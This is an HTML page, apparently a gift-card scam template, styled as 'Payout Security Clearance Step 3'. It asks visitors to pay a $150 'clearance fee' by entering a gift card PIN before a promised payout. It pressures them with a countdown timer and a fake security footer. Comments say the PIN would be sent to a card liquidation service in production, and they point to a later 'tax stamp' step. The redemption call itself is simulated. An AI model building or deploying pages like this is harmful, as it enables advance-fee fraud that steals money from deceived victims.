<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payout Security Clearance | Step 3</title>
    
    <!-- Inline CSS Styling -->
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --accent-red: #ef4444;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --btn-green: #10b981;
            --btn-green-hover: #059669;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
        }

        .header {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .badge {
            display: inline-block;
            background-color: rgba(239, 68, 68, 0.15);
            color: var(--accent-red);
            font-size: 0.75rem;
            font-weight: 700;
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            border: 1px solid rgba(239, 68, 68, 0.3);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 0.75rem;
        }

        h1 {
            font-size: 1.35rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        p.description {
            font-size: 0.875rem;
            color: var(--text-muted);
            line-height: 1.4;
        }

        .timer-box {
            background-color: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .timer-title {
            font-size: 0.75rem;
            color: var(--text-muted);
            text-transform: uppercase;
            margin-bottom: 0.25rem;
        }

        .timer-clock {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--accent-red);
            font-family: monospace;
        }

        .amount-box {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: rgba(255, 255, 255, 0.03);
            padding: 0.75rem 1rem;
            border-radius: 6px;
            font-size: 0.875rem;
            margin-bottom: 1.5rem;
        }

        .amount-label { color: var(--text-muted); }
        .amount-value { font-weight: 700; color: #38bdf8; }

        .form-group {
            margin-bottom: 1.25rem;
        }

        label {
            display: block;
            font-size: 0.825rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: var(--text-main);
        }

        input[type="text"] {
            width: 100%;
            padding: 0.75rem 1rem;
            background-color: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-main);
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus {
            border-color: #38bdf8;
        }

        button.btn-submit {
            width: 100%;
            padding: 0.85rem;
            background-color: var(--btn-green);
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button.btn-submit:hover {
            background-color: var(--btn-green-hover);
        }

        button.btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        #status_message {
            margin-top: 1rem;
            font-size: 0.825rem;
            text-align: center;
            color: var(--accent-red);
            min-height: 1.2em;
        }

        .footer-note {
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: var(--text-muted);
            text-align: center;
            line-height: 1.3;
        }
    </style>

    <!-- Embedded Guard Script (Runs immediately before page renders) -->
    <script>
        (function enforcePortalGuard() {
            const hasWithdrawn = localStorage.getItem("has_withdrawn") === "true";
            const step3Paid = localStorage.getItem("step_3_paid") === "true";
            const currentPath = window.location.pathname;

            // If user hasn't initialized withdrawal, set flag for demo purposes
            if (!localStorage.getItem("has_withdrawn")) {
                localStorage.setItem("has_withdrawn", "true");
            }

            // Lock Condition: Step 3 is already paid, jump to Step 4
            if (hasWithdrawn && step3Paid) {
                if (!currentPath.includes("step-4")) {
                    alert("Step 3 verified. Redirecting to Step 4...");
                    // Simulated navigation redirect
                    // window.location.replace("step4_tax_stamp.html");
                }
            }
        })();
    </script>
</head>
<body>

    <div class="container">
        <div class="header">
            <span class="badge">Action Required</span>
        </div>

        <div class="timer-box">
            <div class="timer-title">Verification Expires In</div>
            <div class="timer-clock" id="countdown">14:59</div>
        </div>

        <div class="amount-box">
            <span class="amount-label">Required Clearance Fee</span>
            <span class="amount-value">$150.00 USD</span>
        </div>

        <div class="form-group">
            <label for="giftcard_pin">Digital Gift Card / Voucher PIN</label>
            <input type="text" id="giftcard_pin" placeholder="Enter 16-Digit Code (e.g. A1B2-C3D4-E5F6)" autocomplete="off">
        </div>

        <button class="btn-submit" id="submit_btn" onclick="submitClearanceCode()">Verify & Process Payout</button>

        <div id="status_message"></div>

        <div class="footer-note">
            Automated Clearance System • Security Protocol SSL-256
        </div>
    </div>

    <!-- Application Script -->
    <script>
        // 1. Countdown Timer Simulation
        let timeLeft = 899; // 14 mins 59 secs
        const timerElement = document.getElementById("countdown");

        const timerInterval = setInterval(() => {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerElement.textContent = "EXPIRED";
            }
            timeLeft--;
        }, 1000);

        // 2. Submission Handler with LocalStorage Update
        async function submitClearanceCode() {
            const cardCode = document.getElementById("giftcard_pin").value.trim();
            const statusBox = document.getElementById("status_message");
            const submitBtn = document.getElementById("submit_btn");

            if (!cardCode || cardCode.length < 10) {
                statusBox.innerText = "Please enter a valid card PIN.";
                return;
            }

            submitBtn.disabled = true;
            statusBox.style.color = "#38bdf8";
            statusBox.innerText = "Verifying code with clearance server...";

            try {
                // Simulated API Call to Card Liquidation Service
                // In production, this fetches: https://api.card-liquidation-service.com/v1/redeem
                const mockApiResponse = await new Promise((resolve) => {
                    setTimeout(() => {
                        resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
                    }, 2000);
                });

                if (mockApiResponse.status === "SUCCESS") {
                    statusBox.style.color = "#10b981";
                    statusBox.innerText = "Payment verified! Updating session...";

                    // Set state flags directly in browser's local storage
                    localStorage.setItem("has_withdrawn", "true");
                    localStorage.setItem("step_3_paid", "true");
                    localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);

                    // Trigger navigation redirect
                    setTimeout(() => {
                        alert("Step 3 cleared! Advancing to Step 4.");
                        location.reload(); // Reloads to trigger guard script behavior
                    }, 1000);
                } else {
                    statusBox.style.color = "#ef4444";
                    statusBox.innerText = "Invalid card PIN. Please try again.";
                    submitBtn.disabled = false;
                }
            } catch (err) {
                statusBox.style.color = "#ef4444";
                statusBox.innerText = "Network error connecting to payment gateway.";
                submitBtn.disabled = false;
            }
        }
    </script>
</body>
</html>
